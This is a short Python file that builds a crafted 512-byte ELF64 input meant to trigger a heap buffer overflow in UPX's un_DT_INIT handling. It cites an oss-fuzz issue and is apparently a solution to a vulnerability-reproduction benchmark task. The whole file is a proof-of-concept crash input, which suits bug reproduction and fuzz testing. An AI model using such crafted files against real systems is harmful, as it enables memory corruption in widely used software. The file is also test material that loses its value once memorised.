import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a 512-byte PoC for UPX Heap Buffer Overflow (oss-fuzz:383200048)
        # The vulnerability involves un_DT_INIT and improper resetting of ph.method.
        # We create an ELF64 file with a PT_DYNAMIC segment containing a crafted DT_INIT.
        # We also inject UPX! magic to trigger the unpacking path.

        # ELF64 Header
        # e_ident: Magic, Class (64), Data (LE), Version, OSABI, ABIVersion, Pad
        elf = bytearray(b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00')
        elf += struct.pack('<H', 3)   # e_type: ET_DYN
        elf += struct.pack('<H', 62)  # e_machine: EM_X86_64
        elf += struct.pack('<I', 1)   # e_version: EV_CURRENT
        elf += struct.pack('<Q', 0)   # e_entry
        elf += struct.pack('<Q', 64)  # e_phoff
        elf += struct.pack('<Q', 0)   # e_shoff
        elf += struct.pack('<I', 0)   # e_flags
        elf += struct.pack('<H', 64)  # e_ehsize
        elf += struct.pack('<H', 56)  # e_phentsize
        elf += struct.pack('<H', 1)   # e_phnum
        elf += struct.pack('<H', 64)  # e_shentsize
        elf += struct.pack('<H', 0)   # e_shnum
        elf += struct.pack('<H', 0)   # e_shstrndx

        # Program Header (PT_DYNAMIC)
        ph = bytearray()
        ph += struct.pack('<I', 2)    # p_type: PT_DYNAMIC
        ph += struct.pack('<I', 6)    # p_flags: RW
        ph += struct.pack('<Q', 128)  # p_offset: Points to dynamic section
        ph += struct.pack('<Q', 0)    # p_vaddr
        ph += struct.pack('<Q', 0)    # p_paddr
        ph += struct.pack('<Q', 32)   # p_filesz: 2 entries (16 bytes each)
        ph += struct.pack('<Q', 32)   # p_memsz
        ph += struct.pack('<Q', 8)    # p_align

        data = elf + ph
        
        # Pad to p_offset (128)
        padding_len = 128 - len(data)
        data += b'\x00' * padding_len

        # Dynamic Section
        # DT_INIT (12) with a large value to trigger OOB read/write in un_DT_INIT
        data += struct.pack('<Q', 12)          # d_tag: DT_INIT
        data += struct.pack('<Q', 0x7FFFFFFF)  # d_val: Large value
        
        # DT_NULL (0)
        data += struct.pack('<Q', 0)           # d_tag: DT_NULL
        data += struct.pack('<Q', 0)           # d_val

        # Pad to 512 bytes
        total_len = 512
        padding_len = total_len - len(data)
        data += b'\x00' * padding_len

        # Inject UPX Magic to be detected as a packed file
        # PackHeader is typically found near the end of the file.
        # Placing UPX! at offset 512 - 36 = 476
        data[476:480] = b'UPX!'
        
        # Set PackHeader version to pass initial checks
        data[480] = 13

        return bytes(data)